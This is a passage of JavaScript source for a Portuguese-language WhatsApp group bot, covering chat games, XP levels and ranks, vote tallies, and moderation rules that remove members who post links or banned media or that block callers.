emojis = ["😀", "😃", "😁", "😆", "😂", "🤣", "😭", "😉", "😘", "😗", "🥰", "😍", "🤩", "🥳", "🙃", "🙂", "🥲", "😋", "😛", "😜", "😝", "😜", "😇", "😊", "☺️", "😏", "😌", "😔", "😑", "😐", "😶", "🤔", "🤫", "🤭", "🥱", "🤗", "🤨", "🧐", "😒", "🙄", "😤", "😠", "🤬", "🥺", "😥", "😟", "☹️", "😦", "😧", "😰", "😨", "😕", "😯", "😲", "😳", "🤯", "😬", "😓", "😓", "😞", "😖", "🥴", "😎", "🤓", "😎", "🥵", "🥶", "🌞", "🤢", "🤮", "🤥", "🤡", "😈", "🥵", "👽", "😷", "💦", "👺", "👹", "💨", "😸", "😹", "❤️", "🫀", "👁️", "☠️", "💀", "👀", "😻", "💋", "🫂", "👄", "👅", "💅", "🙏", "🤳", "✍️", "🙅", "🌀", "☃️", "🔥", "⚡", "🌈", "💧", "🙈", "🍑", "🍒", "🍓", "🍌", "🌶️", "🍆", "🍴", "🍷", "🍴", "🍽️", "🛢️", "🚨", "🎤", "🎭", "📽️", "🎰", "☎️", "📞", "👑", "💎", "💍", "💉", "🗑️", "🗡️", "⚔️", "🚬", "💣", "⁉️", "✅", "👁️‍🗨️", "♥️", "🧡", "💛", "💚", "💙", "💜", "🤎", "🖤", "🤍", "🇧🇷", "🏳️‍🌈", "🇲🇽", "🇪🇸", "🇲🇿", "🇦🇴", "🇺🇲","🤔","🤫","😏","🍆","👺","🙊"]
reassao = emojis[Math.floor(Math.random() * emojis.length)]
sendMsg = await aqua.sendMessage(from, {react: {text: reassao, key: m.key}})
}

if(isAutoReact && isGroup && !isCmd) {
if(!isAutoReact) return 
emojis = ["😀", "😃", "😁", "😆", "😂", "🤣", "😭", "😉", "😘", "😗", "🥰", "😍", "🤩", "🥳", "🙃", "🙂", "🥲", "😋", "😛", "😜", "😝", "😜", "😇", "😊", "☺️", "😏", "😌", "😔", "😑", "😐", "😶", "🤔", "🤫", "🤭", "🥱", "🤗", "🤨", "🧐", "😒", "🙄", "😤", "😠", "🤬", "🥺", "😥", "😟", "☹️", "😦", "😧", "😰", "😨", "😕", "😯", "😲", "😳", "🤯", "😬", "😓", "😓", "😞", "😖", "🥴", "😎", "🤓", "😎", "🥵", "🥶", "🌞", "🤢", "🤮", "🤥", "🤡", "😈", "🥵", "👽", "😷", "💦", "👺", "👹", "💨", "😸", "😹", "❤️", "🫀", "👁️", "☠️", "💀", "👀", "😻", "💋", "🫂", "👄", "👅", "💅", "🙏", "🤳", "✍️", "🙅", "🌀", "☃️", "🔥", "⚡", "🌈", "💧", "🙈", "🍑", "🍒", "🍓", "🍌", "🌶️", "🍆", "🍴", "🍷", "🍴", "🍽️", "🛢️", "🚨", "🎤", "🎭", "📽️", "🎰", "☎️", "📞", "👑", "💎", "💍", "💉", "🗑️", "🗡️", "⚔️", "🚬", "💣", "⁉️", "✅", "👁️‍🗨️", "♥️", "🧡", "💛", "💚", "💙", "💜", "🤎", "🖤", "🤍", "🇧🇷", "🏳️‍🌈", "🇲🇽", "🇪🇸", "🇲🇿", "🇦🇴", "🇺🇲","🤔","🤫","😏","🍆","👺","🙊"]
reassao = emojis[Math.floor(Math.random() * emojis.length)]
sendMsg = await aqua.sendMessage(from, {react: {text: reassao, key: m.key}})
}
//=======================\\

//=====================================

//////////_FUNÇÕES DO JOGO DA VELHA_//////
async function joguinhodavelha() {
if(joguinhodavelhajs2.includes(from) || joguinhodavelhajs.includes(sender)) {
const cmde = body.toLowerCase().split(" ")[0] || "";
let arrNum = ["1", "2", "3", "4", "5", "6", "7", "8", "9"];
if (fs.existsSync(`./funções de cmd/tictactoe/db/${from}.json`)) {
const boardnow = setGame(`${from}`);
if (body == "Cex") return reply("why");
if (
body.toLowerCase() == "s" ||
body.toLowerCase() == "sim" ||
body.toLowerCase() == "ok"
) {
if (boardnow.O == sender.replace("@s.whatsapp.net", "")) {
if (boardnow.status)
return reply(`O jogo já começou antes!`);
const matrix = boardnow._matrix;
boardnow.status = true;
fs.writeFileSync(`./funções de cmd/tictactoe/db/${from}.json`,
JSON.stringify(boardnow, null, 2)
);
const chatAccept = `*🎮Ꮐ̸Ꭺ̸Ꮇ̸Ꭼ̸ Ꭰ̸Ꭺ̸ Ꮩ̸Ꭼ̸Ꮮ̸Ꮋ̸Ꭺ̸🕹️*
    
❌ : @${boardnow.X}
⭕ : @${boardnow.O}
 
Sua vez... : @${boardnow.turn == "X" ? boardnow.X : boardnow.O}

${matrix[0][0]}  ${matrix[0][1]}  ${matrix[0][2]}
${matrix[1][0]}  ${matrix[1][1]}  ${matrix[1][2]}
${matrix[2][0]}  ${matrix[2][1]}  ${matrix[2][2]}
`;
aqua.sendMessage(from, {text: chatAccept}, {quoted: selo,
contextInfo: {
mentionedJid: [
boardnow.X + "@s.whatsapp.net",
boardnow.O + "@s.whatsapp.net", 
],
},
});
}
} else if (
body.toLowerCase() == "n" ||
body.toLowerCase() == "não" ||
body.toLowerCase() == "no"
) {
if (boardnow.O == sender.replace("@s.whatsapp.net", "")) {
if (boardnow.status)
return reply(`O jogo já começou!`);
fs.unlinkSync(`./funções de cmd/tictactoe/db/${from}.json`);
 aqua.sendMessage(from, {text:
 `@${boardnow.X} *_Infelizmente seu oponente não aceitou o desafio ❌😕_*`}, {quoted: selo,
 contextInfo: {
 mentionedJid: [boardnow.X + "@s.whatsapp.net"],
},
}
);
joguinhodavelhajs.splice([])
fs.writeFileSync('./funções de cmd/usuarios/joguinhodavelha.json', JSON.stringify(joguinhodavelhajs))
joguinhodavelhajs2.splice([])
fs.writeFileSync('./funções de cmd/usuarios/joguinhodavelha2.json', JSON.stringify(joguinhodavelhajs2))
}
}
}

if (arrNum.includes(cmde)) {
const boardnow = setGame(`${from}`);
if (!boardnow.status) return reply(`Parece que seu oponente não aceitou o desafio ainda...`)
if (
(boardnow.turn == "X" ? boardnow.X : boardnow.O) !=
     
sender.replace("@s.whatsapp.net", "")
)
return;
const moving = validmove(Number(body), `${from}`);
const matrix = moving._matrix;
if (moving.isWin) {
if (moving.winner == "SERI") {
const chatEqual = `*🎮Ꮐ̸Ꭺ̸Ꮇ̸Ꭼ̸ Ꭰ̸Ꭺ̸ Ꮩ̸Ꭼ̸Ꮮ̸Ꮋ̸Ꭺ̸🕹️*
  
Jogo termina empatado 😐
`;
reply(chatEqual);
fs.unlinkSync(`./funções de cmd/tictactoe/db/${from}.json`);
joguinhodavelhajs.splice([])
fs.writeFileSync('./funções de cmd/usuarios/joguinhodavelha.json', JSON.stringify(joguinhodavelhajs)) 
joguinhodavelhajs2.splice([])
fs.writeFileSync('./funções de cmd/usuarios/joguinhodavelha2.json', JSON.stringify(joguinhodavelhajs2))
return;
}
const abt = Math.ceil(Math.random() + 4000)
const winnerJID = moving.winner == "O" ? moving.O : moving.X;
const looseJID = moving.winner == "O" ? moving.X : moving.O;
const limWin = Math.floor(Math.random() * 1) + 10;
const limLoose = Math.floor(Math.random() * 1) + 5;
const chatWon = `*🎮Ꮐ̸Ꭺ̸Ꮇ̸Ꭼ̸ Ꭰ̸Ꭺ̸ Ꮩ̸Ꭼ̸Ꮮ̸Ꮋ̸Ꭺ̸🕹️*
  
Vencido por @${winnerJID} 😎👑
`;
addLevelingXp(winnerJID + "@s.whatsapp.net", abt)

aqua.sendMessage(from, {text: chatWon}, {quoted: selo,
contextInfo: {
mentionedJid: [
moving.winner == "O" ?
moving.O + "@s.whatsapp.net" :
moving.X + "@s.whatsapp.net",
],
},
});
setTimeout( () => {
if (fs.existsSync("./funções de cmd/tictactoe/db/" + from + ".json")) {
 fs.unlinkSync("./funções de cmd/tictactoe/db/" + from + ".json");
 reply(`*🕹️JOGO DA VELHA RESETADO...🕹️*`);
 } else {
console.log(color(time, "red"), color("[ ESPIRADO ]", "magenta"), color('Jogo da velha espirado', "red"));
 }
joguinhodavelhajs.splice([])
fs.writeFileSync('./funções de cmd/usuarios/joguinhodavelha.json', JSON.stringify(joguinhodavelhajs))
joguinhodavelhajs2.splice([])
fs.writeFileSync('./funções de cmd/usuarios/joguinhodavelha2.json', JSON.stringify(joguinhodavelhajs2))
}, 300000) //5 minutos
reply(`_*🥳Parabéns @${winnerJID} Você ganhou "${abt}" em xp por ter ganhado o jogo da velha🎉...*_`)      
fs.unlinkSync(`./funções de cmd/tictactoe/db/${from}.json`);
joguinhodavelhajs.splice([])
fs.writeFileSync('./funções de cmd/usuarios/joguinhodavelha.json', JSON.stringify(joguinhodavelhajs)) 
joguinhodavelhajs2.splice([])
fs.writeFileSync('./funções de cmd/usuarios/joguinhodavelha2.json', JSON.stringify(joguinhodavelhajs2))
} else {
const chatMove = `*🎮Ꮐ̸Ꭺ̸Ꮇ̸Ꭼ̸ Ꭰ̸Ꭺ̸ Ꮩ̸Ꭼ̸Ꮮ̸Ꮋ̸Ꭺ̸🕹️*
  
❌ : @${moving.X}
⭕ : @${moving.O}

Sua vez : @${moving.turn == "X" ? moving.X : moving.O}

${matrix[0][0]}  ${matrix[0][1]}  ${matrix[0][2]}
${matrix[1][0]}  ${matrix[1][1]}  ${matrix[1][2]}
${matrix[2][0]}  ${matrix[2][1]}  ${matrix[2][2]}
`;
aqua.sendMessage(from, {text: chatMove}, {quoted: selo,
contextInfo: {
mentionedJid: [
moving.X + "@s.whatsapp.net",
moving.O + "@s.whatsapp.net",
],
},
});
}
} 
} 
}

//===================================\\

		//JOGO DO ANAGRAM
if(isGroup && fs.existsSync(`./funções de cmd/anagrama-${from}.json`)){
let dataAnagrama = JSON.parse(fs.readFileSync(`./funções de cmd/anagrama-${from}.json`))
if(budy.slice(0,4).toUpperCase() == dataAnagrama.original.slice(0,4).toUpperCase() && budy.toUpperCase() != dataAnagrama.original) return reply('está perto')
xp = Math.floor(Math.random() * 14) + 3000
if(budy.toUpperCase() == dataAnagrama.original) { aqua.sendMessage(from, {text: `parabéns ${pushname} 🥳 você ganhou o jogo\nPalavra : ${dataAnagrama.original}\nIniciando o proximo jogo em 5 segundos...`}, {"mentionedJid": [sender]}), fs.unlinkSync(`./funções de cmd/anagrama-${from}.json`)		
addLevelingXp(sender, xp)
recompensa = `🎉🎉RECOMPENSA🎉🎉\nVocê ganhou ${xp} em *xp*`
reply(recompensa)
		setTimeout(async() => {
fs.writeFileSync(`./funções de cmd/anagrama-${from}.json`, `${JSON.stringify(palavrasANA[Math.floor(Math.random() * palavrasANA.length)])}`)
let dataAnagrama2 = JSON.parse(fs.readFileSync(`./funções de cmd/anagrama-${from}.json`))
aqua.sendMessage(from, {text:`
╭─────≽「 👾 ANAGRAMA 👾 」
│➽ DESCUBRA A PALAVRA
│➽ ANAGRAMA: ${dataAnagrama2.embaralhada}
│➽ DICA: ${dataAnagrama2.dica}
╰────────────────────────
`}) 
}, 5000)
}}

//========================================\\


//=======FUNCIONALIDADE PATENTE=========\\
const nivelAtual = getLevelingLevel(sender)
var patt = 'Bronze I 🚩'
if (nivelAtual === 1) {patt = 'Bronze  I 🚩' } else if (nivelAtual === 2) {patt = 'Bronze II 🚩'} else if (nivelAtual === 3) {patt = 'Bronze  III 🚩'} else if (nivelAtual === 4) {patt = 'Bronze  IV  🚩'} else if (nivelAtual === 5) {patt = 'Bronze  V 🚩'} else if (nivelAtual === 6) {patt = 'Prata I🥈'} else if (nivelAtual === 7) {patt = 'Prata II🥈'} else if (nivelAtual === 8) {patt = 'Prata III🥈'} else if (nivelAtual === 9) {patt = 'Prata IV🥈'} else if (nivelAtual === 10) {patt = 'Prata V🥈'} else if (nivelAtual === 11) {patt = 'Ouro I🥇'} else if (nivelAtual === 12) {patt = 'Ouro II🥇'} else if (nivelAtual === 13) {patt = 'Ouro III🥇'} else if (nivelAtual === 14) {patt = 'Ouro IV🥇'} else if (nivelAtual === 15) {patt = 'Ouro V🥇'} else if (nivelAtual === 16) {patt = 'Campeão I🏆'} else if (nivelAtual === 17) {patt = 'Campeão II🏆'} else if (nivelAtual === 18) {patt = 'Campeão III🏆'} else if (nivelAtual === 19) {patt = 'Campeão IV🏆'} else if (nivelAtual === 20) {patt = 'Campeão V🏆'} else if (nivelAtual === 21) {patt = 'Diamante I 💎'} else if (nivelAtual === 22) {patt = 'Diamante II 💎'} else if (nivelAtual === 23) {patt = 'Diamante III 💎'} else if (nivelAtual === 24) {patt = 'Diamante IV 💎'} else if (nivelAtual === 25) {patt = 'Diamante V 💎'} else if (nivelAtual === 26) {patt = 'Mestre I 🐂'} else if (nivelAtual === 27) {patt = 'Mestre II 🐂'} else if (nivelAtual === 28) {patt = 'Mestre III 🐂'} else if (nivelAtual === 29) {patt = 'Mestre IV 🐂'} else if (nivelAtual === 30) {patt = 'Mestre V 🐂'} else if (nivelAtual === 31) {patt = 'Mítico I 🔮'} else if (nivelAtual === 32) {patt = 'Mítico II 🔮'} else if (nivelAtual === 33) {patt = 'Mítico III 🔮'} else if (nivelAtual === 34) {patt = 'Mítico IV 🔮'} else if (nivelAtual === 35) {patt = 'Mítico V 🔮'} else if (nivelAtual === 36) {patt = 'God I🕴'} else if (nivelAtual === 37) {patt = 'God II🕴'} else if (nivelAtual === 38) {patt = 'God III🕴'} else if (nivelAtual === 39) {patt = 'God IV🕴'} else if (nivelAtual === 40) {patt = 'God V🕴'} else if (nivelAtual > 41) {patt = '[💦] DEUS SUPREMO [💦]'}
//========================================\\

//==========(FUNÇÃO DE LEVEL)=============\\
if (isGroup && isLevelingOn) {
const currentLevel = getLevelingLevel(sender)
const checkId = getLevelingId(sender)
try {
if (currentLevel === undefined && checkId === undefined) addLevelingId(sender)
const amountXp = Math.floor(Math.random() * 10) + 500
const requiredXp = 5000 * (Math.pow(2, currentLevel) - 1)
const getLevel = getLevelingLevel(sender)
addLevelingXp(sender, amountXp)
if (requiredXp <= getLevelingXp(sender)) {
addLevelingLevel(sender, 1)
await reply(`*╭━─━───༺[🗯]༻────━─━╮*
           *[🗯] PARABÉNS [💫]*
*╰━─━───༺[💫]༻────━─━╯*
[💫] Parabéns, Voce subiu
[💫] Continue subindo E Melhorando

*[🗯] NOVO NÍVEL ALCANÇADO [💫]*

[🗯] *CHAT:* ${sender.split("@")[0]}.           
[🗯] *PATENTE*: ${patt}
[🗯] *XP:* ${getLevelingXp(sender)}
[🗯] *ANTIGO:* ${getLevel} 
[🗯] *NEW LEVEL:* ${getLevelingLevel(sender)}`)}
} catch (err) {
console.error(err)
}
}

//=======================================\\

//===============(simih)=============\\
const simih = async (text) => {
	try {
		const sami = await fetch(`https://api.brizaloka-api.tk/ia/simsimi?apikey=brizaloka&text=${text}`, {method: 'GET'})
		const res = await sami.json()
		return res.resultado.resposta
	} catch {
		return 'Desculpe, Não Entendi'
	}
}


async function AntilinkHardF() {
if(isUrl(budy2) && isAntiLinkHard && isGroupAdmins && isBotGroupAdmins && !info.key.fromMe) {
if(command == "tiktok" && command == "facebook" && command == "instagram" && command == "tiktok" && command == "twitter" && command == "ytmp3" && command == "ytmp4" && command == "play") return
linkgpp = await aqua.groupInviteCode(from)
if(budy2.match(`${linkgpp}`)) return
if(!isUrl(budy2)) return 
if(type === "buttonsResponseMessage") return
if(type === "listResponseMessage") return
if(budy2.includes(`${linkgpp}`)) return 
reply('*Link detectado, porém usuário é admin*')
}

if(isUrl(budy2) && isAntiLinkHard && !isGroupAdmins && isBotGroupAdmins && !info.key.fromMe) {
if(command == "tiktok" && command == "facebook" && command == "instagram" && command == "tiktok" && command == "twitter" && command == "ytmp3" && command == "ytmp4" && command == "play") return  
linkgpp = await aqua.groupInviteCode(from)
if(budy2.match(`${linkgpp}`)) return reply('Link do nosso grupo, não irei remover.. ')  
if(!isUrl(budy2)) return 
if(type === "buttonsResponseMessage") return
if(type === "listResponseMessage") return
reply('*Link detectado, punindo usuário...*')
if(!JSON.stringify(groupMembers).includes(sender)) return
aqua.groupParticipantsUpdate(from, [sender], 'remove')
}
} 
AntilinkHardF()
joguinhodavelha()

if(isUrl(body) && isAntilinkgp && isGroup && isBotGroupAdmins) {
if(!isAntilinkgp) return
if(!isUrl(body)) return 
if(isGroupAdmins) return reply("Você é adm, não removerei você..") 
if(budy2.includes("chat.whatsapp.com/")){
if(!budy2.includes("chat.whatsapp.com/")) return
if(isBot) return 
linkgpp = await aqua.groupInviteCode(from)
if(budy.match(`${linkgpp}`)) return reply('Link do nosso grupo, não irei remover.. ')  
reply('*Link de grupo detectado, punindo usuário...*')
if(!JSON.stringify(groupMembers).includes(sender)) return
aqua.groupParticipantsUpdate(from, [sender], 'remove')
}
}


//======(ANTI-IMAGEM)========\\
if(isAntiImg && isBotGroupAdmins && type == 'imageMessage') {
if (m.key.fromMe) return
if(isGroupAdmins) return aqua.sendMessage(from, {text:'*mensagem proibida detectada, porém é admin logo a punição será anulada*'}, {quoted: selo})
await aqua.sendMessage(from, {text: '*mensagem proibida detectada, banindo...*'}, {quoted: selo})
setTimeout(async function () {
aqua.groupParticipantsUpdate(from, [sender], 'remove')
}, 1000)
}

//======(ANTI-STICKER)========\\
if(isAntiSticker && isBotGroupAdmins && type == 'stickerMessage') {
if (m.key.fromMe) return
if(isGroupAdmins) return aqua.sendMessage(from, {text:'*mensagem proibida detectada, porém é admin logo a punição será anulada*'}, {quoted: selo})
await aqua.sendMessage(from, {text: '*mensagem proibida detectada, banindo...*'}, {quoted: selo})
setTimeout(async function () {
aqua.groupParticipantsUpdate(from, [sender], 'remove')
}, 1000)
}

if(Antidoc && isBotGroupAdmins && type == 'documentMessage') {
if (m.key.fromMe) return
if(isGroupAdmins) return aqua.sendMessage(from, {text:'*mensagem proibida detectada, porém é admin logo a punição será anulada*'}, {quoted: selo})
await aqua.sendMessage(from, {text: '*mensagem proibida detectada, banindo...*'}, {quoted: selo})
setTimeout(async function () {
aqua.groupParticipantsUpdate(from, [sender], 'remove')
}, 1000)
}

// ANTI NOTAS FAKES ======================>

if(isAntiNotas && body.toString().match(/(💳|💎|💸|💵|💷|💶|🪙|💰|🤑|⚖️)/gi) && isBotGroupAdmins) {
if(type == 'stickerMessage') return
let verificar = body.toString().match(/(💳|💎|💸|💵|💷|💶|🪙|💰|🤑|⚖️)/gi)
if (verificar && body.length < 100) return  
await aqua.sendMessage(from, {text: '*mensagem proibida detectada, banindo...*'}, {quoted: selo})
setTimeout(async function () {
aqua.groupParticipantsUpdate(from, [sender], 'remove')
}, 1000)
}

//FINALZIN ==============================>


//======(ANTI-VIDEO)========\\
if(isAntiVid && isBotGroupAdmins && type == 'videoMessage') {
if(isGroupAdmins) return aqua.sendMessage(from,{text:'*mensagem proibida detectada, porém é admin logo a punição será anulada*'}, {quoted: selo})
await aqua.sendMessage(from, {text: '*mensagem proibida detectada, banindo...*'}, {quoted: selo})
setTimeout(async function () {
aqua.groupParticipantsUpdate(from, [sender], 'remove')
}, 1000)
}

//======(ANTI-AUDIO)=======\\
if(isAntiAudio && isBotGroupAdmins && type == 'audioMessage') {
if(isGroupAdmins) return aqua.sendMessage(from, {text:'*mensagem proibida detectada, porém é admin logo a punição será anulada*'}, {quoted: selo})
await aqua.sendMessage(from, {text: '*mensagem proibida detectada, banindo...*'}, {quoted: selo})
setTimeout(async function () {
aqua.groupParticipantsUpdate(from, [sender], 'remove')
}, 1000)
}
//=======================================\\

if(isGroup && isBotGroupAdmins && !isGroupAdmins && !SoDono && !info.key.fromMe) {
if(info.message?.extendedTextMessage?.contextInfo?.mentionedJid?.length == groupMembers.length || info.message?.extendedTextMessage?.contextInfo?.mentionedJid?.length == groupMembers.length - 1) { 
reply("MEMBRO COM MENSAGEM DE MARCAÇÃO DE TODOS DO GRUPO, POR CONTA DISSO VOU REMOVER DO GRUPO, QUALQUER COISA VÁ NO PV DO ADMINISTRADOR...")
aqua.groupParticipantsUpdate(from, [sender], "remove")
}
}


//========(ANTI-PV-QUE-BLOQUEIA)======\\
if(isAntiPv && !isGroup && !SoDono  && !m.key.fromMe && !isPremium){ 
reply("[👤] Ola Humano: ${pushname}\nDesculpe, Mas Atualmente Não Estou Autorizada A Responder Comandos No Privado, Então Irei Lhe Bloquear Ta Bom?\nBjs Da Deusa Aqua")
setTimeout(async () => {
aqua.updateBlockStatus(sender, 'block')
}, 1000)
return
}
//======================================\\



// ANTI_LIGAR \\

if(!isGroup && isAnticall) {
aqua.ws.on('CB:call', async (B) => {
if (B.content[0].tag == 'offer') {
aqua.sendMessage(B.content[0].attrs['call-creator'], { text: "Não pode ligar para o bot seu merda, você será bloqueado..." }).then(() => { 
delay(4000)
aqua.updateBlockStatus(B.content[0].attrs['call-creator'], "block") })
}
})
}


//=========(ANTIPV-QUE-SÓ-FALA)==========\\

if(!isGroup && !isPremium && !SoDono && !m.key.fromMe && banChats === true) return 
const atibot = m.isBaileys
if (atibot === true) return 


//======================================\\
 
if(fs.existsSync(`./func/limitecaracteres/limite-c_${from}.json`)) {
var limitecaracteres_on = JSON.parse(fs.readFileSync(`./func/limitecaracteres/limite-c_${from}.json`))
var limitefl = limitecaracteres_on.limite
} else {
var limitefl = limitefll.limitefl
}



      const allForcaId = []
for(let obj of forca) allForcaId.push(obj.id)
const isPlayForca = allForcaId.indexOf(sender) >= 0 ? true : false

async function randompalavra() {
    return new Promise(async (resolve, reject) => {
fetch('https://www.palabrasaleatorias.com/palavras-aleatorias.php?fs=1&fs2=0&Submit=Nova+palavra',).then(async function (res, err) {
if(err) reject(err)    
var $ = cheerio.load(await res.text())
resolve($('body > center > center > table:nth-child(4) > tbody > tr > td > div')[0].children[0].data)
})
    }) 
}


//===================================== 

const enviarfiguimg = async (jid, path, quoted, options = {}) => {
let buff = Buffer.isBuffer(path) ? path: /^data:.*?\/.*?;base64,/i.test(path) ? Buffer.from(path.split`,`[1], 'base64'): /^https?:\/\//.test(path) ? await (await getBuffer(path)): fs.existsSync(path) ? fs.readFileSync(path): Buffer.alloc(0)
let buffer
if (options && (options.packname || options.author)) {
 buffer = await writeExifImg(buff, options)
} else {
 buffer = await imageToWebp(buff)
}
await aqua.sendMessage(jid, {
 sticker: {
url: buffer
 }, ...options
}, {
 quoted
})
return buffer
 }

//===================================== 

 const enviarfiguvid = async (jid, path, quoted, options = {}) => {
let buff = Buffer.isBuffer(path) ? path: /^data:.*?\/.*?;base64,/i.test(path) ? Buffer.from(path.split`,`[1], 'base64'): /^https?:\/\//.test(path) ? await (await getBuffer(path)): fs.existsSync(path) ? fs.readFileSync(path): Buffer.alloc(0)
let buffer
if (options && (options.packname || options.author)) {
 buffer = await writeExifVid(buff, options)
} else {
 buffer = await videoToWebp(buff)
}

await aqua.sendMessage(jid, {
 sticker: {
url: buffer
 }, ...options
}, {
 quoted
})
return buffer
 }    
 
//======================\\
const GroupsMutedActived = []
            for(let obj of muted) {
                GroupsMutedActived.push(obj.jid)
            }
            const isMuted = (isGroup && GroupsMutedActived.indexOf(from) >= 0) ? true : false
            const NumbersMuted = isMuted ? muted[GroupsMutedActived.indexOf(from)].numbers : []
            if(isMuted && NumbersMuted.indexOf(sender) >= 0){
                aqua.groupParticipantsUpdate(from, [sender], 'remove')
                reply('Opa, Você Não Pode Falar Aqui...\nAdeus Humano...')
//=======================\\

const mencionar = ( foto, texto, membro, ids ) => {
( ids == null || ids == undefined || ids == false ) ? aqua.sendMessage(from, { image: foto, caption: texto.trim(), contextInfo: { "mentionedJid": membro } }) : aqua.sendMessage(from, { image: foto, caption: texto.trim(), contextInfo: { "mentionedJid": membro } })
}

//========================\\

//-_-_-_-_--_-_-_-_-_--_-JSON-FUNÇÕES-_-_-_-_-_-_-_-_-_-_-_-_\\
const { addVotoDuelo, delVotoDuelo } = require('./funcoes/votoduelo.js')

//-_-_-_-_--_-_-_-_-_--_--_-_-_-_-_-_-_-_-_-_-_-_\\

const votacao = JSON.parse(fs.readFileSync('./dados/votacao/votacao.json'))

const votacaoduelo = JSON.parse(fs.readFileSync('./dados/duelo/votacaoduelo.json'))
//-_-_-_-_--_-_-_-_-_--_--_-_-_-_-_-_-_-_-_-_-_-_\\

//============(FUNÇÕES)============\\

const isVoto = isGroup ? votacao.includes(from) : false

const isVotoDuelo = isGroup ? votacaoduelo.includes(from) : false

//-_-_-_-_--_-_-_-_-_--_--_-_-_-_-_-_-_-_-_-_-_-_\\

/** VOTAÇÃO ESTILO DUELO : VS **/

if( isGroup ) {

if (budy.toLowerCase() === 'um'){

let voto = JSON.parse(fs.readFileSync(`./dados/duelo/P_votos/${from}.json`))
let _votos = JSON.parse(fs.readFileSync(`./dados/duelo/votos/${from}.json`))
let filtro = voto.map(v => v.participante)
let id_voto = sender ? sender : '0@s.whatsapp.net'
if(filtro.includes(id_voto)) {
return mentions('Olá '+'@' + sender.split('@')[0] + '\n~ Não é possível votar duas vezes.', filtro, true)
} else {
voto.push({
participante: id_voto,
votacao: '1'
})
fs.writeFileSync(`./dados/duelo/P_votos/${from}.json`,JSON.stringify(voto))
let _p = []
let _voto = `VOTAÇÃO...\n\nParticipante 1: @${_votos[0].votos.split('@')[0]}\nParticipante 2: @${_votos[0].votos2.split('@')[0]}\nMotivo da votação: ${_votos[0].razao}\nTotal de votos: ${voto.length}.\nDuração: ${_votos[0].duracao} minuto.`
for(let i = 0; i < voto.length; i++) {
_voto +=  `\n\n========\nMembro: @${voto[i].participante.split('@')[0]}\nVotou em: ${voto[i].votacao}\n========`
_p.push(voto[i].participante)
}
_p.push(_votos[0].votos, _votos[0].votos2)
mentions(_voto,_p,true)
}
} else if (budy.toLowerCase() === 'dois'){
const voto = JSON.parse(fs.readFileSync(`./dados/duelo/P_votos/${from}.json`))
let _votos = JSON.parse(fs.readFileSync(`./dados/duelo/votos/${from}.json`))
let filtro = voto.map(v => v.participante)
let id_voto = sender ? sender : '0@s.whatsapp.net'
if(filtro.includes(id_voto)) {
return mentions('Olá '+'@' + sender.split('@')[0] + '\n~ Não é possivel votar duas vezes.', filtro, true)
} else {
voto.push({
participante: id_voto,
votacao: '2'
})
fs.writeFileSync(`./dados/duelo/P_votos/${from}.json`,JSON.stringify(voto))
let _p = []
let _voto = `VOTAÇÃO...\n\nParticipante 1: @${_votos[0].votos.split('@')[0]}\nParticipante 2: @${_votos[0].votos2.split('@')[0]}\nMotivo da votação: ${_votos[0].razao}\nTotal de votos: ${voto.length}.\nDuração: ${_votos[0].duracao} minuto.`
for(let i = 0; i < voto.length; i++) {
_voto +=  `\n\n========\nMembro: @${voto[i].participante.split('@')[0]}\nVotou em: ${voto[i].votacao}\n========\n`
_p.push(voto[i].participante)
}
_p.push(_votos[0].votos, _votos[0].votos2)
mentions(_voto,_p,true)
}
}
}	


//======================================\\

//========(CONTADOR-DE-MENSAGENS)========\\

const groupIdscount = []
const numbersIds = []
for(let obj of countMessage) {
groupIdscount.push(obj.groupId)
}
if(isGroup && groupIdscount.indexOf(from) >= 0) {
var ind = groupIdscount.indexOf(from)
for(let obj of countMessage[ind].numbers) {numbersIds.push(obj.id)}
if(numbersIds.indexOf(sender) >=0) {
var indnum = numbersIds.indexOf(sender)
countMessage[ind].numbers[indnum].messages += 1
countMessage[ind].numbers[indnum].cmd_messages += isCmd ? 1 : 0
fs.writeFileSync('./funções de cmd/grupos/countmsg.json', JSON.stringify(countMessage, null, 2)+ '\n')
} else {
const messages = 1
const cmd_messages = isCmd ? 1 : 0
countMessage[ind].numbers.push({
id: sender,
messages: messages,
cmd_messages: cmd_messages
})
fs.writeFileSync('./funções de cmd/grupos/countmsg.json', JSON.stringify(countMessage, null, 2) + '\n')
}
} else if(isGroup) {
countMessage.push({
groupId: from,
numbers: [{
id: sender,
messages: 2,
cmd_messages: isCmd ? 1 : 0
}]
})
fs.writeFileSync('./funções de cmd/grupos/countmsg.json', JSON.stringify(countMessage, null, 2) + '\n')
}


//======================================\\

//===============(AUTO-BAN)=============\\
const dbids = []
for(i=0;i<adeuscara.length;++i) {
dbids.push(adeuscara[i].groupId)
}
const isAdeusCara = (isGroup && dbids.indexOf(from) >= 0) ? true : false

//======================================\\


//=====================================   

this.suit = this.suit ? this.suit : {}
let roof = Object.values(this.suit).find(roof => roof.id && roof.status && [roof.p, roof.p2].includes(m.sender))
if (roof) {
let win = ''
let tie = false
if (sender == roof.p2 && /^(acc(ept)?|aceitar|Aceitar|Ok?|aceita|Ação|Posterior|ga(k.)?bisa|y)/i.test(m.text) && m.isGroup && roof.status == 'wait') {
if (/^(Menos|Ação|rejeitar|n|ga(k.)?bisa)/i.test(m.text)) {
aqua.sendTextWithMentions(from, `@${roof.p2.split`@`[0]} terno de lixo, terno cancelado`, m)
delete this.suit[roof.id]
return !0
}
roof.status = 'play'
roof.asal = from
clearTimeout(roof.waktu)
//delete roof[roof.id].waktu
aqua.sendText(from, `O jogo foi enviado para conversar.

@${roof.p.split`@`[0]} e 
@${roof.p2.split`@`[0]}

Selecione o jogo em cada bate-papo"
clique https://wa.me/${botNumber.split`@`[0]}`, m, { mentions: [roof.p, roof.p2] })
if (!roof.pilih) aqua.sendText(roof.p, `Por favor, selecione \n\nPedra🗿\nPapel📄\nTesoura✂️`, m)
if (!roof.pilih2) aqua.sendText(roof.p2, `Por favor, selecione \n\nPedra🗿\nPapel📄\Tesoura✂️`, m)
roof.waktu_milih = setTimeout(() => {
if (!roof.pilih && !roof.pilih2) aqua.sendText(from, `Ambos os jogadores não têm intenção de jogar,\njogo cancelado`)
else if (!roof.pilih || !roof.pilih2) {
win = !roof.pilih ? roof.p2 : roof.p
aqua.sendTextWithMentions(from, `@${(roof.pilih ? roof.p2 : roof.p).split`@`[0]} não escolher um jogo, o jogo terminou`, m)
}
delete this.suit[roof.id]
return !0
}, roof.timeout)
}
let jwb = m.sender == roof.p
let jwb2 = m.sender == roof.p2
let g = /tesoura/i
let b = /pedra/i
let k = /papel/i
let reg = /^(tesoura|pedra|papel)/i
